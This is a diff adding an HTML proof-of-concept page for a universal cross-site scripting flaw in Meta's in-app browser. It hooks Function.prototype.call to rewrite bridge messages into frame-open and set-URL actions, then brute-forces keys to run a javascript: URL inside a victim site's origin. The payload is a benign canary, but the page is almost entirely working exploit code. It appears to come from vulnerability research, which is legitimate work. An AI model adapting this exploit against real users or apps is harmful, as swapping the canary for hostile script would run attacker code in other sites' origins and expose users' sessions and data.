@@ -1,13 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>navframe uxss</title>
+<style>
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
+ h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
+ pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ button{font-size:14px;padding:11px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:5px 0}
+ button:disabled{opacity:.4}
+ input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
+ #uxss{display:none;background:#c0392b;color:#fff;padding:12px;border-radius:6px;font-weight:700}
+ .warn{color:#b23;font-size:11px}
+</style>
+</head>
+<body>
+<h1>Meta IAB — new-frame + set-url UXSS (gated, benign)</h1>
+<p style="font-size:12px;color:#666">Open inside the FB/Messenger (or IG) app in-app browser. Classic
+Meta IAB UXSS: rewrite the page-triggerable <code>window-alert</code> bridge message into
+<code>window-new-frame</code> (open victim) then brute <code>window-set-url</code> with a
+<code>javascript:</code> canary into the victim frame. Benign canary only. Brute is GATED behind a
+check that alert is actually JS-bridged (prevents a native-alert dialog storm).</p>
+
+<div id="uxss">⚠ UXSS CANARY — ran as document.domain=<span id="ud"></span></div>
+
+<input id="victim" value="https://www.google.com/ncr">
+<h2>step 1 — is alert JS-bridged? (fires ONE alert)</h2>
+<button onclick="testBridged()">test: does alert() flow through Function.prototype.call?</button>
+<h2>step 2 — open victim frame (window-new-frame)</h2>
+<button id="b2" onclick="openFrame()" disabled>open victim frame</button>
+<h2>step 3 — UXSS: set-url javascript: (key brute, gated+capped)</h2>
+<input id="maxkey" value="2000">
+<button id="b3" onclick="brute()" disabled>brute window-set-url → javascript: canary</button>
+
+<h2>log</h2><pre id="log"></pre>
+<p class="warn">Brute only enabled after step 1 confirms alert is bridged (no native dialog). Own device.</p>
+
 <script>
-window.onload=function(){
-	Function.prototype.call=function(e){
-		if(e && e[0] && e[0]=="window-alert"){
-			e[0]="dispatch-action";
-			e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/csi"}';
-		}
-		return this.apply(e);
-	}
-	alert();
+function g(id){return document.getElementById(id);}
+var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
+function victim(){return (g('victim').value||'https://www.google.com/ncr').trim();}
+window.__UXSS=function(d){try{g('ud').textContent=(d||document.domain);g('uxss').style.display='block';document.title='UXSS';log('*** UXSS CANARY FIRED domain='+(d||document.domain)+' ***');}catch(
+e){}};
+
+var _call=Function.prototype.call, _apply=Function.prototype.apply;
+var mode=null, bridged=false, sawMsg=false, kmax=2000;
+
+// single hook: recon + conditional rewrite depending on mode
+Function.prototype.call=function(){
+  try{
+    var e=arguments[0];
+    // recon: did a window-alert bridge message pass through?
+    if(e && typeof e==='object' && e[0]==='window-alert'){ sawMsg=true;
+      if(mode==='newframe'){ e[0]='dispatch-action'; e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"'+victim()+'"},"openInForeground":true}'; log('rewrote -> window-new-frame '+vic
+tim()); }
+      else if(mode==='seturl'){ e[0]='dispatch-action'; e[1]='{"actionType":"window-set-url","location":"javascript:window.__UXSS&&__UXSS(document.domain)","key":'+mode_key+'}'; }
+      else { log('recon: window-alert bridge msg seen (array): '+JSON.stringify(e).slice(0,160)); }
+    }
+  }catch(err){}
+  return _call.apply(this, arguments);
+};
+var mode_key=0;
+
+function testBridged(){
+  mode=null; sawMsg=false;
+  var before=Date.now();
+  try{ alert('probe'); }catch(e){}
+  var dt=Date.now()-before;
+  // if a native dialog showed, alert() blocks until dismissed -> dt is large; and sawMsg stays false
+  if(sawMsg){ bridged=true; g('b2').disabled=false; log('ALERT IS BRIDGED ✅ (window-alert flowed through .call) — weaponize enabled'); }
+  else { bridged=false; log('alert NOT bridged (native dialog, dt='+dt+'ms, no .call msg). This app build is not exploitable by this technique. Try FB/Messenger or older build.'); }
 }
+function openFrame(){ if(!bridged){log('not bridged');return;} mode='newframe'; try{alert();}catch(e){} mode=null; log('fired new-frame open for '+victim()+' — now try step 3'); g('b3').disabled=fa
+lse; }
+function brute(){
+  if(!bridged){ log('refused: alert not bridged (would spam native dialogs)'); return; }
+  kmax=Math.min(parseInt(g('maxkey').value||'2000',10)||2000, 10000);
+  mode='seturl'; log('brute set-url key 0..'+kmax+' with javascript: canary…');
+  for(var k=0;k<=kmax;k++){ mode_key=k; try{ alert(); }catch(e){} }
+  mode=null; log('brute done. If UXSS CANARY fired above, javascript: executed in the victim frame = UXSS.');
+}
+log('IG='+/Instagram/i.test(navigator.userAgent)+' FB='+/FBAN|FBAV/i.test(navigator.userAgent)+' origin='+location.origin);
+log('Step 1 first. Only if "ALERT IS BRIDGED" appears will brute run (anti dialog-storm).');
 </script>
-<h1>This page is not Google.</h1>
+</body>
+</html>
+
+
+⏺ Login expired
